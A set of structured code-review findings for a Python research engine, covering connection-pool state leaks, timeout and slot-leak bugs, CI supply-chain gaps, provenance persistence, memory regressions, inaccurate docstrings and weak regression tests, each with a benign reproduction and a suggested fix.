findings.title: lock_timeout session-GUC leaks into pooled connection used for all later checkpoint writes
findings.description: During schema bootstrap _acquire_migration_lock runs `SELECT set_config('lock_timeout', %s, false)` with is_local=false, i.e. SESSION scope. The connection is drawn from `pool` via `with pool.connection() as conn:` and, on block exit, is RETURNED to that same pool. psycopg_pool does NOT reset session state on check-in unless a `reset=` callback is configured on ConnectionPool (none is). The very same pool is then handed to PostgresSaver(pool) and used for every subsequent checkpoint read/write. So the bootstrap-only lock_timeout (default 30s) silently persists as a session setting on a long-lived pooled connection and applies to ordinary checkpoint operations. Under lock contention a normal checkpoint write that would otherwise block briefly will instead abort with 'canceling statement due to lock_timeout', i.e. durability loss at exactly the interrupt/resume the checkpointer exists to guarantee. is_local=true was avoided because under autocommit a transaction-local SET would not survive to the separate pg_advisory_lock statement — so the fix is to explicitly RESET after acquiring, or run bootstrap on a connection that is closed (not returned to the pool).
findings.poc: 1) ASSAY_MIGRATION_LOCK_TIMEOUT_MS=30000 (default). 2) get_checkpointer() bootstraps; the bootstrap connection has lock_timeout='30s' set at session scope and is returned to the pool. 3) Two runs resume concurrently and contend on the same checkpoint row; a checkpoint UPDATE waits on the row lock >30s and raises 'canceling statement due to lock_timeout' instead of completing — a spurious durability failure. Reproduce by asserting `conn.execute("SHOW lock_timeout").fetchone()` is not '0' on a connection re-checked-out from the pool after bootstrap.
findings.suggested_fix: After PostgresSaver(conn).setup() succeeds (and the advisory unlock), reset the GUC on the same connection before block exit: `conn.execute("SELECT set_config('lock_timeout', '0', false)")` (or use RESET lock_timeout) in the finally block alongside the unlock; or configure ConnectionPool(reset=lambda c: c.execute('RESET ALL')); or open a dedicated one-shot psycopg.connect() for bootstrap that is closed rather than returned to the pool, so no bootstrap session state ever reaches checkpoint operations.

findings.title: BULK tier has no inner cancellation (asymmetric with HIGH_STAKES #127) — a hung backend permanently leaks a pool slot and drives endless retryable backpressure
findings.description: HIGH_STAKES wraps its work in `anyio.fail_after(HIGH_STAKES_TIMEOUT)` (#127) so a hung subprocess is actually CANCELLED inside the worker, freeing the bounded-pool slot. BULK has no equivalent: it relies solely on `client_kwargs={'timeout': BULK_TIMEOUT}` reaching httpx through ChatOllama, and on the outer `_with_timeout(..., BULK_TIMEOUT+10)` which, as its own docstring states, CANNOT interrupt a thread blocked in a backend call. If the httpx timeout does not fire (connection wedged mid-stream, a proxy holding the socket, ChatOllama not propagating client_kwargs on the streaming path, or a C-level blocking read), the worker thread is stuck forever and its _inflight slot is never released. Worse, because _submit_bounded reports saturation as a RETRYABLE RateLimitError and _run_with_retries treats RateLimitError as transient backpressure, once enough BULK workers wedge (up to _POOL_WORKERS=8) every future call loops on saturation backpressure that can never clear — a livelock that bricks the seam with no terminal error. The 3-pass hardening fixed the HIGH_STAKES leak but left the BULK path with the same defect it set out to close.
findings.poc: Monkeypatch _bulk_complete to call a blocking no-timeout read (simulate ChatOllama not honoring client_kwargs timeout): `def hang(): import threading; threading.Event().wait()`. Submit _POOL_WORKERS BULK requests via _with_timeout; each returns FuturesTimeout to the caller but the worker stays alive holding its slot. After 8 such, every subsequent _submit_bounded raises RateLimitError('saturated') indefinitely and _run_with_retries loops on backpressure forever (until RATE_LIMIT_MAX_RETRIES then PermanentReasoningError-by-exhaustion — but slots never recover for the rest of process life).
findings.suggested_fix: Give BULK the same inner, in-worker hard bound as HIGH_STAKES: run the ChatOllama call under an interruptible mechanism the worker itself can abort (e.g. run the generation inside `anyio.run` with `anyio.fail_after(BULK_TIMEOUT)` wrapping an async ollama call, or use the ollama async client; alternatively spawn the backend call in a cancellable subprocess). At minimum, document and enforce a watchdog that, on repeated saturation that never clears, surfaces a PermanentReasoningError ('reasoning pool wedged') rather than infinite RateLimitError backpressure, and add an explicit assertion that ChatOllama honors client_kwargs timeout on the streaming path.

findings.title: _release sets the idempotency flag on the Future under the lock but the done-callback may run before the flag attribute is settable, double-decrementing on AttributeError swallow
findings.description: _release relies on setting `future._assay_released = True` to be idempotent. The set is wrapped in `except (AttributeError, TypeError): pass` 'defensive' for Futures that disallow attribute assignment. concurrent.futures.Future DOES allow arbitrary attributes, so in practice the guard is fine — but the defensive branch creates a real correctness hole: if attribute assignment ever fails (a subclassed/slotted Future, or a test double), the early-return guard `getattr(future,'_assay_released',False)` can NEVER become True, so both the done-callback path AND the _submit_bounded interrupt-fallback path will each pass the guard and execute `_inflight -= 1`, over-releasing the slot. Over-release lets _inflight drift negative, defeating the saturation guard (more than _POOL_WORKERS concurrent submits) — the inverse of the leak the guard protects against. The 'at most once' invariant the comment claims is only true when attribute assignment succeeds.
findings.poc: Pass a Future-like object with __slots__ (no _assay_released slot) to _submit_bounded such that add_done_callback fires _release once and the BaseException fallback fires _release again. Each call's `future._assay_released = True` raises AttributeError (swallowed), the guard never trips, _inflight is decremented twice for one reserved slot, leaving _inflight negative.
findings.suggested_fix: Do not depend on per-object attribute assignment for idempotency. Track released futures in a set keyed by id() under _inflight_lock, or (simpler) make the done-callback the SOLE releaser and drop the interrupt-window fallback by reserving the slot only after add_done_callback is attached (submit, attach callback, then increment — or use a try/finally that the callback owns exclusively). If keeping the flag approach, make assignment failure fatal (assert) rather than silently swallowed, so the idempotency invariant cannot be violated.

findings.title: _CONN_INIT_LOCKS grows unboundedly — never pruned, keyed by raw conn_str
findings.description: _CONN_INIT_LOCKS is a process-lifetime dict keyed by the resolved conn_str and entries are only ever added (under _init_lock in _conn_init_lock), never removed. _POOLS_BY_CONN has the same add-only lifecycle. For a fixed deployment with one DB this is harmless, but get_postgres_connection_string() resolves from the ASSAY_POSTGRES_URL env each call, and conn_str distinctness includes any variation in the URL string (host alias, optional params, credentials rotation that changes the userinfo, sslmode toggles). Any workload that legitimately targets many distinct databases/DSNs over a long-lived process (multi-tenant runner, test harness rotating DSNs, credential rotation) accumulates a Lock object (and, for _POOLS_BY_CONN, a live ConnectionPool + worker thread) per distinct string with no eviction — an unbounded cache and, for pools, an unbounded thread/connection leak. Note credential rotation makes the SAME logical DB appear as a NEW conn_str, so the old pool is orphaned in _OPEN_POOLS (still atexit-closed, but never reused and never closed until exit).
findings.poc: In a loop, set os.environ['ASSAY_POSTGRES_URL'] to N distinct valid loopback DSNs (e.g. differing in an appended '?application_name=run_i') and call get_checkpointer() each iteration; observe len(cp._CONN_INIT_LOCKS) and len(cp._POOLS_BY_CONN) grow to N and the process worker-thread count climb by one per distinct DSN, none reclaimed.
findings.suggested_fix: Bound and/or key-normalize the caches: (a) canonicalize conn_str (drop volatile query params / strip userinfo for the cache key while keeping it for connect) so credential rotation and cosmetic param changes map to one entry; (b) cap _POOLS_BY_CONN with an LRU that closes (pool.close()) and removes the evicted pool from _OPEN_POOLS before discarding it; (c) prune _CONN_INIT_LOCKS for keys no longer in _POOLS_BY_CONN. This caps threads/connections and meta-dict growth in long-lived multi-DSN processes.

findings.title: HIGH_STAKES inner fail_after races the outer _with_timeout, and on cancellation parts/result_error are read after a partially-cancelled drain
findings.description: _high_stakes_complete runs `anyio.run(_drain)` inside a pool worker; _drain wraps _drain_stream in `anyio.fail_after(HIGH_STAKES_TIMEOUT)` while the outer _with_timeout uses `HIGH_STAKES_TIMEOUT + 30`. The two timers are close enough that under load (GC pause, scheduler delay) the outer FuturesTimeout can fire first; when it does, _with_timeout returns to the caller but the worker keeps running anyio.run until fail_after eventually cancels — the slot is held for up to ~30s extra (acceptable) BUT the bigger issue is correctness of shared state: parts (list) and result_error (dict) are mutated by the async iterator and read on the SAME worker thread after anyio.run returns, which is fine for the success path; however `anyio.fail_after` raises TimeoutError which is caught by the broad `except Exception` and re-raised as ReasoningError, discarding any partial parts already appended — so a near-complete reply that trips the inner timeout by one chunk is treated as a hard transient failure rather than salvaging captured text. More subtly, if query()'s cancellation does not actually tear down the subprocess (SDK swallows the cancel), the worker remains blocked past fail_after with no further timer, re-introducing the slot leak #127 claimed to fix. The two-timer design leaves no margin assertion that inner<outer with enough headroom.
findings.poc: Set HIGH_STAKES_TIMEOUT small; mock query() to yield N-1 of N chunks then sleep just over the inner timeout. Observe: parts holds N-1 partial chunks, fail_after raises, caught by `except Exception`, re-raised as ReasoningError; the partial text is dropped and the attempt counts as a transient failure. Separately, mock query() to ignore cancellation (await a shielded sleep) and observe the worker outlives fail_after, holding its _inflight slot.
findings.suggested_fix: (a) Make the timer hierarchy explicit and safe: assert/derive the outer timeout as inner + fixed headroom and document the worker may outlive the caller by that headroom. (b) Catch TimeoutError from fail_after distinctly from generic Exception so a near-complete reply can either be salvaged (if parts is non-empty) or raised as a clearly-typed timeout. (c) Harden cancellation: run query() in a structure that GUARANTEES subprocess teardown on cancel (e.g. anyio cancel scope + explicit process kill / context-manager close of the query stream), and add a test that a cancellation-ignoring backend still releases the slot.

findings.title: Bootstrap connection context-manager may COMMIT/return a connection left in a broken state if advisory-unlock and DDL both fail, with the pool reusing it
findings.description: In get_checkpointer, `with pool.connection() as conn:` acquires the advisory lock, runs setup() DDL, then best-effort unlocks in finally (swallowing errors). If setup() raises, the outer `except Exception` closes and de-registers the whole pool (good). But the unlock is swallowed unconditionally, and on autocommit the connection is then returned to the pool by the context manager even though it may still hold the session advisory lock (if pg_advisory_unlock failed e.g. due to a transient error) or carry the leaked lock_timeout GUC (see C-1). A returned connection that still holds the migration advisory lock will, on its next checkout for a real checkpoint op, keep blocking any OTHER process trying to bootstrap the same schema — the very cross-process serialization the lock provides is undermined because the lock is held by a connection now doing unrelated work. The auto-release-on-connection-return comment assumes the connection is CLOSED on return, but a pooled connection is reset/reused, not closed, so the session (and its advisory lock) persists.
findings.poc: Force pg_advisory_unlock to raise (monkeypatch conn.execute to throw only on the unlock statement). setup() succeeds, pool is cached and returned. The bootstrap connection retains the session advisory lock and is checked back into the pool. A second process calling get_checkpointer() on the same DB blocks on pg_advisory_lock for the full lock_timeout because process 1's pooled (idle) connection still holds it.
findings.suggested_fix: Do not rely on connection-return to release the session advisory lock — pooled connections are reset, not closed. Either (a) run bootstrap on a dedicated psycopg.connect() that is explicitly closed (closing the session truly releases the lock and discards GUCs — also fixes C-1), or (b) on unlock failure, mark the connection broken (conn.close() / pool.putconn(close=True)) so it is not returned to the pool holding the lock, and verify the unlock actually ran (check pg_advisory_unlock's boolean result) before treating it as released.

findings.title: SBOM step re-runs pip-audit without the allowlist, so an accepted advisory fails CI
findings.description: The audit job's vulnerability gate (line 113-127) builds an --ignore-vuln allowlist from .pip-audit-ignore and passes it to pip-audit. The very next step, 'SBOM (CycloneDX) from the lockfile' (line 135), runs `pip-audit --progress-spinner off -r requirements.lock --format cyclonedx-json -o sbom.cyclonedx.json` under `set -euo pipefail` and WITHOUT any --ignore-vuln args. pip-audit exits non-zero whenever it finds a vulnerability regardless of the chosen output format, so any advisory that the team has consciously allowlisted (present in the pinned set but accepted/unfixable) will pass the gate step but then FAIL the SBOM step — bricking CI on exactly the condition the allowlist exists to handle. The allowlist is effectively a no-op once any accepted advisory is ever added. This also means the SBOM is never emitted when it is most needed (a dependency set with a known, accepted advisory).
findings.poc: Add a real advisory id to .pip-audit-ignore for a package pinned in requirements.lock that currently has that advisory. The 'pip-audit (reproducible known-vulnerability scan)' step passes (allowlisted). The 'SBOM (CycloneDX) from the lockfile' step runs pip-audit without --ignore-vuln, pip-audit exits 1 on the same advisory, `set -e` aborts the step, the audit job fails, and `all-checks` blocks the merge — despite the advisory being explicitly accepted.
findings.suggested_fix: Build the IGNORES array once (or factor it into a shell function) and reuse it in the SBOM invocation, OR generate the SBOM with the cyclonedx export tool decoupled from the vuln scan (e.g. `pip-audit ... --format cyclonedx-json --ignore-vuln <id> ...`, or use `cyclonedx-py requirements requirements.lock`). The SBOM should describe the dependency set independent of whether an accepted advisory exists.

findings.title: run_study never persists the provenance trail or attaches it to the MLflow run — auto-path provenance is volatile and uncorrelated
findings.description: run_study records a rich hash-chained provenance trail and stores the experiment_run_id INSIDE the trail's run_end entry (line 717-723), but it never (a) writes the trail anywhere durable, nor (b) attaches the trail to the experiment run via tracker.log_artifact, even when a tracker is present and run_id is known. The trail lives only in StudyResult.provenance (in-memory). Persistence is entirely opt-in: a caller must remember to call StudyResult.persist_trail() and then tracker.log_artifact() (documented at pipeline.py:226-244 and tracking.py:92). Consequently the default governed run produces an MLflow run with metrics but NO link back to the append-only audit trail, and the trail evaporates on process exit. GOVERNANCE §3 calls the trail 'the spine of reproducibility and of the independence claim', yet the composed runner — the engine-owned guarantee — does not durably emit it. The correlation is also one-directional: the trail names the run_id, but the run has no artifact pointing back to the trail.
findings.poc: Call run_study(plan, gate_handler=auto_approve, tracker=MlflowExperimentTracker()). On success you get a StudyResult; the MLflow run has params/metrics but zero artifacts. Inspect the MLflow run: there is no provenance.json. Let the process exit: StudyResult.provenance is gone. An auditor opening the MLflow run cannot retrieve or verify the hash-chained trail that produced the recorded metrics.
findings.suggested_fix: When a tracker and run_id are present, have run_study automatically persist the trail to a temp/working path and call tracker.log_artifact(run_id, path) in the success path (and ideally a best-effort partial trail on the failure path), guarded best-effort like the other track() calls so a tracker failure never aborts the run. At minimum, log the trail as an MLflow artifact so the run and the trail are bidirectionally correlated.

findings.title: Dependabot updates pyproject ranges but cannot regenerate the hash-pinned lockfiles the CI gate enforces, so its PRs will fail the lockfile-sync gate; uv.lock is unmanaged
findings.description: The pip ecosystem entry (directory '/') lets Dependabot bump version constraints in pyproject.toml, but the CI audit job (ci.yml:98-112) enforces that requirements.lock and requirements-core.lock are byte-for-byte regenerable from pyproject via `uv pip compile`. Dependabot has no hook to run `uv pip compile`, so any Dependabot PR that changes a pyproject constraint will leave the two committed lockfiles stale and FAIL the lockfile-sync gate -> all-checks blocks the merge -> the dependency-update PRs are unmergeable without manual intervention on every one. Worse, most runtime deps live in optional-extras with floors-only or range pins (e.g. langgraph>=1.2,<2), so Dependabot may not even open PRs while the actually-installed transitive versions in requirements.lock silently drift. Additionally, uv.lock is committed but is referenced by nothing in CI (the gate compiles to requirements*.lock instead), so it is an orphaned, unverified lock artifact that can diverge from the enforced locks unnoticed.
findings.poc: Wait for a weekly Dependabot pip PR (or simulate by bumping any pyproject constraint and committing without regenerating the locks). The audit job's 'Lockfiles are in sync with pyproject' step diffs requirements.lock against a fresh `uv pip compile` and exits 1 with '::error::requirements.lock is stale'. all-checks fails. The Dependabot PR cannot merge.
findings.suggested_fix: Either (a) add a CI/Dependabot post-update step (or a scheduled workflow / Dependabot-compatible action) that runs `uv pip compile` for both lockfiles and commits the result, or (b) switch the supply-chain workflow to manage and audit uv.lock directly (uv-native), and drop the orphaned lock. Document which lock is canonical and ensure exactly one is enforced. Consider versioning-strategy and grouping so the lock-regeneration burden is batched.

findings.title: Audit-gate tooling (pip-audit, pip-licenses) is installed unpinned, undermining the reproducibility the rest of the job enforces
findings.description: The audit job pins uv to an exact version (line 103) precisely for reproducibility, and the whole job's stated purpose is a reproducible, hash-pinned supply-chain scan. Yet pip-audit is installed with `python -m pip install --upgrade pip pip-audit` (line 97, unpinned, no hashes) and pip-licenses with `python -m pip install pip-licenses` (line 154, unpinned). These tools run inside the trusted CI gate with access to the checkout; a malicious or broken release of pip-audit/pip-licenses (or of their transitive deps) executes in CI and could either suppress findings (a compromised pip-audit reporting clean) or break the gate. This is the same supply-chain risk class the job is built to defend against, applied to the defender itself, and is inconsistent with the uv pin already present.
findings.poc: A compromised pip-audit patch release is published. On the next CI run, `pip install --upgrade pip-audit` pulls it, and the 'pip-audit (reproducible known-vulnerability scan)' step runs attacker-controlled code with the lockfile and CI token in scope; a tampered pip-audit could exit 0 on a vulnerable set, silently passing the gate.
findings.suggested_fix: Pin pip-audit and pip-licenses to exact versions (matching the reproducibility posture used for uv), ideally installed from the hashed dev lockfile or with `--require-hashes`. Add them to the locked dev toolchain so they are covered by the same pinning/auditing as everything else.

findings.title: run_failed provenance entry omits experiment_run_id, so a failed run's trail cannot be correlated to its MLflow run
findings.description: On success, the terminal run_end entry records experiment_run_id (line 721), giving an auditor the cross-store link between the provenance trail and the MLflow run. On the error path the run_failed entry (lines 731-737) records error_type/message/last_phase but NOT experiment_run_id, even though run_id is in scope and the finally block does terminate the MLflow run as FAILED (line 754). A failed run is the case where correlation matters most (debugging an abort), yet the trail and the FAILED MLflow run share no recorded id. Combined with O-2 (the trail is not persisted/attached on the failure path either), a failed governed run leaves a FAILED MLflow run and an in-memory-only trail with nothing linking them.
findings.poc: Run run_study with a tracker and a plan whose discover() raises. The MLflow run is set to FAILED; the trail's run_failed entry has no experiment_run_id. Given only the FAILED MLflow run id, you cannot find its trail; given only the trail, you cannot find the MLflow run.
findings.suggested_fix: Include experiment_run_id=run_id in the run_failed trail.record() payload (it is a deterministic value, preserving the hash-determinism guarantee), mirroring the run_end entry, so failed runs are equally correlatable across the provenance trail and the experiment store.

findings.title: numpy resample-stability path allocates a full R×N boolean matrix (peak-memory blowup vs pure path)
findings.description: The numpy branch of `_resample_stability` computes `null_arr[None, :] >= res_arr[:, None]` (and the `<=` variant), materializing a dense R×N boolean array before `.sum(axis=1)`. This is O(R·N) PEAK MEMORY, whereas the pure-Python fallback it claims to merely 'speed up' is O(N) memory (one resample at a time). At corpus scale this inverts: e.g. R=10k resamples vs an N=10k permutation null is 10^8 booleans ≈ 100 MB transient just for the comparison mask, and large nulls (which whole-corpus permutation tests routinely use) make it worse. So enabling the optional `baseline`/numpy extra silently raises peak memory by orders of magnitude exactly on the inputs the vectorization is meant to help, and can OOM where the pure path would not. The docstring frames the numpy path as 'purely a speed optimization, never a semantic change' — but it is also a large, undocumented memory regression.
findings.poc:
import numpy as np
from assay_engine.methodology import confirm
# R=20000 resamples, N=20000 null -> a 20000x20000 bool mask = 4e8 bytes (~400MB) allocated
# transiently inside _resample_stability, vs the pure path's O(N) working set.
null = list(np.random.default_rng(0).normal(size=20000))
res  = list(np.random.default_rng(1).normal(0.5, size=20000))
confirm._resample_stability(res, null, 'greater', 0.05)  # spikes ~400MB; pure path would not
findings.suggested_fix: Sort the null once and use `np.searchsorted` to get per-resample extreme counts in O((R+N)logN) time and O(R+N) memory, avoiding the R×N mask entirely. For 'greater': `cnt = len(null) - np.searchsorted(null_sorted, res_arr, side='left')`; for 'less': `cnt = np.searchsorted(null_sorted, res_arr, side='right')`. This yields the identical integer extreme-counts (so the `(cnt+1)/(n+1) <= alpha` test is byte-identical) while removing the quadratic allocation. If keeping the broadcast form, at minimum chunk the resamples (process `res` in fixed-size blocks) so peak memory is bounded by block_size×N, and document the memory characteristic in the docstring.

findings.title: corpus_fingerprint materializes the full unit/relation payload before the 'streaming' hash, defeating the streaming optimization's intent
findings.description: `corpus_fingerprint` was changed (pass 3, #F-016) to stream JSON via `JSONEncoder.iterencode` 'rather than materialize one giant string' so a large corpus does not hold the full serialized payload in RAM at hash time. But the function first builds two full Python lists — `units` (a dict per unit with `_plain(u.attributes)` deep-canonicalized) and `relations` — and wraps them in a single `payload` dict, which is then handed whole to `iterencode`. For a large corpus this re-materializes the entire row set (plus a deep-canonicalized copy of every attribute mapping) in memory on top of the corpus itself, which is the dominant memory cost; the iterencode change only avoids the comparatively small extra copy of the final JSON *string*. The optimization's stated goal (bounded RAM at corpus scale) is therefore only partially met, and the docstring overstates the benefit.
findings.poc:
# For a corpus of N units each with a non-trivial attributes mapping, corpus_fingerprint
# allocates: (a) a list of N dicts, (b) a deep _plain() copy of every attributes map,
# (c) the relations list -- all live simultaneously before iterencode runs. Peak extra RAM
# is O(total corpus payload), not O(1) as the 'streaming' framing implies.
findings.suggested_fix: Either (a) soften the docstring to state honestly that only the serialized-string copy is avoided, the row dicts are still materialized; or (b) to genuinely bound memory, feed `iterencode` a generator-backed structure (e.g. hash units and relations incrementally — sort ids, then for each unit in sorted order update the hash with the canonical-JSON of just that row) so no full list/dict of the whole corpus is ever resident. Since this is a blueprint with no real corpus, (a) is the cheap, honest fix.

findings.title: Pipeline builds the corpus unit-id set twice on the same corpus (redundant O(U) pass)
findings.description: In `run_study`, line 435 builds `unit_ids = {u.unit_id for u in corpus.units}` inside the DISCOVERY branch to validate split ids, and line 445 builds an identical `corpus_unit_ids = {u.unit_id for u in corpus.units}` unconditionally for the feature-builder ghost-id check. When a study runs in DISCOVERY mode AND declares feature builders (the common case), the corpus units are iterated twice to construct the same set. Cheap to fix and trivially correct.
findings.poc:
# A DISCOVERY-mode study with feature_builders triggers two full passes over corpus.units
# building the identical {unit_id} set (pipeline.py:435 and :445).
findings.suggested_fix: Hoist a single `corpus_unit_ids = {u.unit_id for u in corpus.units}` once, before the DISCOVERY split check, and reuse it for both the split-drift guard (line 436-441) and the feature-builder ghost-id guard (line 454-459). Drop the duplicate set comprehension.

findings.title: No test asserts the numpy resample-stability path's memory bound, and the pure↔numpy equivalence test uses only tiny inputs
findings.description: Test-quality gap tied to P-1: `test_resample_stability_numpy_path_matches_pure_python` validates numerical equivalence only on small arrays (null=40, res=25). There is no test exercising the path at any size that would surface the R×N allocation, and no test pinning the documented contract that the numpy path is 'purely a speed optimization, never a semantic change' against the memory dimension. As a result a future refactor to a chunked/searchsorted implementation (the P-1 fix) has no guardrail proving it preserves results at scale, and the current quadratic-memory behavior is invisible to the suite. This is the kind of coverage hole a discrimination auditor focused on correctness would miss because the existing test passes.
findings.poc:
# The only equivalence test (tests/test_confirm.py:191) uses null=40, res=25 -- far below any
# size where the R x N boolean mask is observable. No test covers large-R/large-N parity or any
# memory characteristic.
findings.suggested_fix: Add a parametrized equivalence test over a moderately larger null/resample size (e.g. N=2000, R=2000) asserting numpy-path == pure-path, so any future memory-bounded rewrite (P-1) is held to byte-identical results. Optionally add a `tracemalloc`-based regression test that the stability computation's peak allocation scales sub-quadratically once P-1 lands.

findings.title: Unkeyed-trail warning and verify_trail=False fast path have no negative/behavioral test
findings.description: Test-quality gap. `run_study` emits a `warnings.warn(...)` when the provenance trail is unkeyed (secret=None, line 300-305) and supports `verify_trail=False` to skip the O(N) re-hash (line 702-710). I find no test asserting (a) that the unkeyed warning actually fires on the default path (so a future refactor silencing it would go unnoticed — the warning is the only signal an operator gets that the trail is forgery-vulnerable), nor (b) that `verify_trail=False` actually skips `trail.verify()` while still producing a valid result, nor (c) that passing both `secret` and `trail` raises the documented ValueError (line 291-292). These are error/edge paths whose absence means the safety affordances can silently regress.
findings.poc:
# grep of tests/ shows no assertion of the 'UNKEYED' warning, no test toggling verify_trail,
# and no test for the 'pass either a caller-owned trail OR a secret' ValueError guard.
findings.suggested_fix: Add focused tests: use `pytest.warns(UserWarning, match='UNKEYED')` around a default `run_study` call; assert `run_study(..., verify_trail=False)` returns a StudyResult and (via monkeypatch/spy on `ProvenanceTrail.verify`) that verify was not called on the success path while still being recoverable via `verify_records`; and `pytest.raises(ValueError)` when both `secret=` and `trail=` are passed.

findings.title: unfreeze() docstring and inline comment promise 'stable order for reproducible output' for frozensets, but the unorderable-element fallback iterates in non-deterministic order
findings.description: The unfreeze() docstring (line 146) states 'frozenset -> sorted list (stable order for reproducible output)'. The inline comment on line 154 further claims the fallback will 'keep insertion-free stable repr'. The implementation (lines 153-158) attempts sorted(value); when the elements are not mutually orderable it falls into the except TypeError branch (line 158) and iterates the frozenset directly: [unfreeze(v) for v in value]. Frozenset iteration order for non-string / mixed-type / FrozenDict elements is determined by element hash values and is NOT stable across processes (for str elements it varies with PYTHONHASHSEED; for FrozenDict/object elements with id-based hashing it varies per run). So the output order is NOT reproducible, directly contradicting both the docstring and the inline comment. This is the F-032 class: a comment/docstring asserting a property the code does not deliver. unfreeze() is the documented serialization thaw for public payloads (e.g. GateReview.payload, #141) and for the determinism/provenance records that exist precisely to be reproducible, so non-deterministic ordering here can leak into reproducibility-critical output and break byte-for-byte comparison of serialized artifacts.
findings.poc:
Confirmed empirically. FrozenDict has no usable __lt__ (sorted raises TypeError), so a frozenset of FrozenDicts hits the fallback. For str/int mixed frozensets the order varies across PYTHONHASHSEED:

  $ for s in 0 1 2; do PYTHONHASHSEED=$s python3 -c "<load _frozen>; print(unfreeze(frozenset(['alpha',1,'beta',2,'gamma'])))"; done
  [1, 2, 'gamma', 'beta', 'alpha']
  [1, 2, 'alpha', 'gamma', 'beta']
  [1, 2, 'gamma', 'alpha', 'beta']

Three different orderings for the same input across three processes — not the promised 'stable order for reproducible output'. A frozenset of FrozenDicts (sorted() raises) is similarly non-deterministic.
findings.suggested_fix: Make the fallback deterministic so it matches the promise: return [unfreeze(v) for v in sorted(value, key=repr)] in the except branch (and update the comment to say it sorts by repr). Sorting by repr gives a process-stable order for unorderable elements. Note repr of FrozenDict reflects dict insertion order, which is itself stable per-construction; if elements may differ only by set-content ordering, sort the canonicalized form instead. Alternatively, sort by canonical_json(unfreeze(v)) to guarantee a fully type-faithful, process-stable key.

findings.title: Comment claims the determinism freeze keeps an array 'opaque/O(1)', but freeze() copies the whole buffer via tobytes() (O(N) in array size)
findings.description: The docstring of cosine_similarity_matrix_array() (line 125) states 'the determinism freeze keeps an array opaque/O(1), unlike a nested list'. The actual freeze() path for an array-like object (src/assay_engine/_frozen.py lines 109-118) calls value.tobytes() and wraps it in a (kind, shape, bytes) descriptor tuple, then re-freezes that. tobytes() materializes/copies every byte of the array, which is O(N) in the number of elements, not O(1). The intended contrast is real (an ndarray is converted with one tobytes() call rather than recursing element-by-element through Python-level freeze() as a nested list would), but the literal 'O(1)' claim is incorrect — both memory and time for the freeze of an array are O(N).
findings.poc: For an ndarray of n elements, _frozen.freeze() executes tobytes() (line 118), which allocates and copies n*itemsize bytes — linear in n. There is no constant-time path: a 10M-element array produces a 10M*itemsize-byte bytes object each time it is frozen. The claim 'O(1)' is therefore false; the operation is O(N).
findings.suggested_fix: Soften the comment to describe what is actually true: the freeze traverses an array in a single tobytes() call (one Python-level step / O(1) traversal *depth*) instead of recursing element-by-element like a nested list, but the conversion itself is O(N) in array size. E.g. replace 'opaque/O(1)' with 'opaque, frozen in a single tobytes() pass (no per-element Python recursion), unlike a nested list'.

findings.title: _release() 'idempotent / at-most-once' guarantee silently degrades to no guarantee if setting the per-future flag fails
findings.description: The comment block (lines 197-202, reinforced at 243-244) asserts '_release runs at most once' and 'released exactly once either way', achieved via a per-future _assay_released flag set under the lock. However, the flag-set (line 208) is wrapped in try/except (AttributeError, TypeError): pass (lines 207-210). If setting the attribute ever fails, the guard silently does nothing: the next _release(future) call will not observe _assay_released, will pass the guard, and will decrement _inflight a second time — exactly the double-release the comment claims is prevented. In practice concurrent.futures.Future permits arbitrary instance attributes (no __slots__), so this path is currently unreachable, which is why it is low severity; but the comment states the idempotency as an unconditional guarantee while the implementation makes it conditional on the (untested, swallowed) attribute assignment succeeding. The 'pragma: no cover - defensive' marker confirms the failure branch is never exercised.
findings.poc: If a future-like object with __slots__ (no _assay_released slot) or a property blocking assignment were ever passed to _release, the assignment future._assay_released = True raises AttributeError, is swallowed (line 209), and _inflight is decremented. A subsequent _release(future) for the same future (the done-callback + interrupt-fallback double path the comment describes on lines 238-249) again fails the getattr(future,'_assay_released',False) check (still False), passes the guard, and decrements _inflight a second time — over-releasing a slot, the precise inverse failure the guard exists to prevent.
findings.suggested_fix: Do not swallow the flag-set failure while still decrementing. Either (a) set the flag in a side table keyed by id(future) (or a WeakSet) so idempotency does not depend on mutating the future object, or (b) if the flag cannot be set, do NOT decrement (treat as 'cannot prove single-release' and skip), and/or surface a diagnostic, so the 'at most once' invariant cannot be silently violated.

findings.title: test_cosine_matrix_scale_uses_fast_path passes even if the numpy fast path is reverted to the pure O(n^2*d) path
findings.description: The test claims to guard against "a regression to the pure O(n^2*d) path at corpus scale". Its only fast-path-discriminating assertion is `assert elapsed < 2.0`. The remaining assertions (`len(m) == 300`, `m[0][0] == pytest.approx(1.0)`) are satisfied identically by either path. I measured the pure-Python path directly: `_cosine_matrix_pure` on a 300x64 matrix completes in ~0.084s — ~24x under the 2.0s threshold. Therefore reverting the dispatch in `cosine_similarity_matrix` (src/assay_engine/baseline/primitives.py:155) so it always calls `_cosine_matrix_pure` leaves this test GREEN. The test does not discriminate the fix it names; the 2.0s budget is far too loose to detect the pure path, and a real regression on a larger corpus (where the pure path's quadratic cost actually bites) would not be caught here either.
findings.poc: In src/assay_engine/baseline/primitives.py, change `cosine_similarity_matrix` (lines 153-155) to unconditionally `return _cosine_matrix_pure(rows)` (i.e. delete the numpy fast-path branch). `test_cosine_matrix_scale_uses_fast_path` still passes: 300x64 pure-path runtime ~0.08s < 2.0s, and m[0][0] is still 1.0 with dims 300x300.
findings.suggested_fix: Make the test assert the fast path is actually taken rather than timing it. E.g. monkeypatch `assay_engine.baseline.primitives._cosine_matrix_pure` to raise/record and assert it is NOT called when numpy is installed, OR spy on `_cosine_matrix_numpy` and assert it WAS called. Drop the brittle `elapsed < 2.0` wall-clock assertion (it is both non-discriminating and flaky on loaded CI).

findings.title: test_install_flush_on_exit_wires_atexit_and_sigterm passes even if the SIGTERM handler wiring (#O3) is fully reverted
findings.description: The test name and intent assert that BOTH atexit and the SIGTERM handler are wired (the #O3 fix: atexit does not run on `kill`/container-stop, so a main-thread SIGTERM handler is also installed to flush spans). But the SIGTERM half is asserted only inside `if "h" in captured:` (lines 188-190). `captured["h"]` is populated solely as a side effect of the source calling `signal.signal(SIGTERM, _handler)` (src/assay_engine/observability/tracing.py:141). If a developer reverts the entire SIGTERM block (tracing.py:131-142) and keeps only `atexit.register(...)` (line 130), then `signal.signal` is never invoked, `captured` stays empty, the `if "h" in captured` branch is skipped, and the test passes on the atexit assertions alone. So the SIGTERM portion of this regression guard is vacuous on the exact revert it is supposed to catch — the conditional turns a should-be-required assertion into a no-op when the fix is missing.
